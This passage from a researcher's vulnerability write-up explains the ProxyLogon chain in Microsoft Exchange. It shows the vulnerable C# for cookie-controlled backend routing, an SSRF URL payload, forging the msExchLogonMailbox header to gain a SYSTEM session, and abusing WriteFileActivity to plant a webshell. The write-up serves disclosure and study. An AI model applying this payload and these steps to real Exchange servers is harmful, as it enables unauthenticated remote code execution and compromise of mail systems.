&lt;p&gt;There are more than 20 handlers corresponding to different application paths in the Frontend. While reviewing the implementations, we found the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetTargetBackEndServerUrl&lt;/code&gt;, which is responsible for calculating the Backend URL in the static resource handler, assigns the Backend target by cookies directly.&lt;/p&gt;

&lt;p&gt;Now you figure out how simple this vulnerability is after learning the architecture!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;HttpProxy\ProxyRequestHandler.cs&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-cs highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;virtual&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Uri&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;GetTargetBackEndServerUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;LogElapsedTime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;E_TargetBEUrl&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;Uri&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;UrlAnchorMailbox&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urlAnchorMailbox&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AnchoredRoutingTarget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AnchorMailbox&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UrlAnchorMailbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlAnchorMailbox&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urlAnchorMailbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;UriBuilder&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clientUrlForProxy&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetClientUrlForProxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;clientUrlForProxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Scheme&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UriSchemeHttps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;clientUrlForProxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Host&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AnchoredRoutingTarget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BackEndServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Fqdn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;clientUrlForProxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Port&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AnchoredRoutingTarget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BackEndServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Version&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E15MinVersion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ProxyToDownLevel&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;RequestDetailsLoggerBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RequestDetailsLogger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SafeAppendGenericInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Logger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ProxyToDownLevel&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;clientUrlForProxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Port&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;443&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clientUrlForProxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;finally&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;LogElapsedTime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;L_TargetBEUrl&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From the code snippet, you can see the property &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BackEndServer.Fqdn&lt;/code&gt; of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AnchoredRoutingTarget&lt;/code&gt; is assigned from the cookie directly.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;HttpProxy\OwaResourceProxyRequestHandler.cs&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-cs highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;override&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AnchorMailbox&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ResolveAnchorMailbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;HttpCookie&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpCookie&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClientRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;X-AnonResource-Backend&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpCookie&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;savedBackendServer&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpCookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IsNullOrEmpty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;savedBackendServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Logger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;X-AnonResource-Backend-Cookie&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ExTraceGlobals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VerboseTracer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IsTraceEnabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ExTraceGlobals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VerboseTracer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TraceDebug&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpCookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetHashCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[OwaResourceProxyRequestHandler::ResolveAnchorMailbox]: AnonResourceBackend cookie used: {0}; context {1}.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpCookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TraceContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ServerInfoAnchorMailbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BackEndServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FromString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;savedBackendServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;AnonymousAnchorMailbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Though we can only control the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Host&lt;/code&gt; part of the URL, but hang on, isnâ€™t &lt;a href=&quot;https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf&quot;&gt;manipulating a URL Parser&lt;/a&gt; exactly what I am good at? Exchange builds the Backend URL by built-in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UriBuilder&lt;/code&gt;. However, since C# didnâ€™t verify the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Host&lt;/code&gt;, so we can enclose the whole URL with some special characters to access arbitrary servers and ports.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://[foo]@example.com:443/path#]:444/owa/auth/x.js&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So far we have a super SSRF that can control almost all the HTTP requests and get all the replies. The most impressive thing is that the Frontend of Exchange will generate a Kerberos Ticket for us, which means even when we are attacking a protected and domain-joined HTTP service, we can still hack with the authentication of Exchange Machine Account.&lt;/p&gt;

&lt;p&gt;So, what is the root cause of this arbitrary Backend assignment? As mentioned, the Exchange Server changes its architecture while releasing new versions. It might have different functions in different versions even with the same component under the same name. Microsoft has put great effort into ensuring the architectural capability between new and old versions. This cookie is a quick solution and the design debt of Exchange making the Frontend in the new architecture could identify where the old Backend is.&lt;/p&gt;

&lt;h2 id=&quot;cve-2021-27065---post-auth-arbitrary-file-write&quot;&gt;CVE-2021-27065 - Post-auth Arbitrary-File-Write&lt;/h2&gt;

&lt;p&gt;Thanks to the super SSRF allowing us to access the Backend without restriction. The next is to find a RCE bug to chain together. Here we leverage a Backend internal API &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proxyLogon.ecp&lt;/code&gt; to become the admin. The API is also the reason why we called it ProxyLogon.&lt;/p&gt;

&lt;p&gt;Because we leverage the Frontend handler of static resources to access the ECExchange Control Panel (ECP) Backend, the header &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msExchLogonMailbox&lt;/code&gt;, which is a special HTTP header in the ECP Backend, will not be blocked by the Frontend. By leveraging this minor inconsistency, we can specify ourselves as the SYSTEM user and generate a valid ECP session with the internal API.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With the inconsistency between the Frontend and Backend, we can access all the functions on ECP by Header forgery and internal Backend API abuse. Next, we have to find an RCE bug on the ECP interface to chain them together. The ECP wraps the Exchange PowerShell commands as an abstract interface by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/ecp/DDI/DDIService.svc&lt;/code&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DDIService&lt;/code&gt; defines several PowerShell executing pipelines by XAML so that it can be accessed by Web. While verifying the DDI implementation, we found the tag of WriteFileActivity did not check the file path properly and led to an arbitrary-file-write.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;DDIService\WriteFileActivity.cs&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-cs highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;override&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RunResult&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DataRow&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DataTable&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dataTable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DataObjectStore&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;store&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;codeBehind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Workflow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UpdateTableDelegate&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;updateTableDelegate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;DataRow&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dataRow&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dataTable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Rows&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InputVariable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OutputFileNameVariable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;RunResult&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;runResult&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;RunResult&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;runResult&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ErrorOccur&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StreamWriter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;streamWriter&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;StreamWriter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FileMode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CreateNew&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;streamWriter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;WriteLine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;runResult&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ErrorOccur&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There are several paths to trigger the vulnerability of arbitrary-file-write. Here we use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ResetOABVirtualDirectory.xaml&lt;/code&gt; as an example and write the result of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Set-OABVirtualDirectory&lt;/code&gt; to the webroot to be our Webshell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we have a working pre-auth RCE exploit chain. An unauthenticated attacker can execute arbitrary commands on Microsoft Exchange Server through an exposed 443 port. Here is an &lt;a href=&quot;https://www.youtube.com/watch?v=SvjGMo9aMwE&quot;&gt;demonstration video&lt;/a&gt;:&lt;/p&gt;

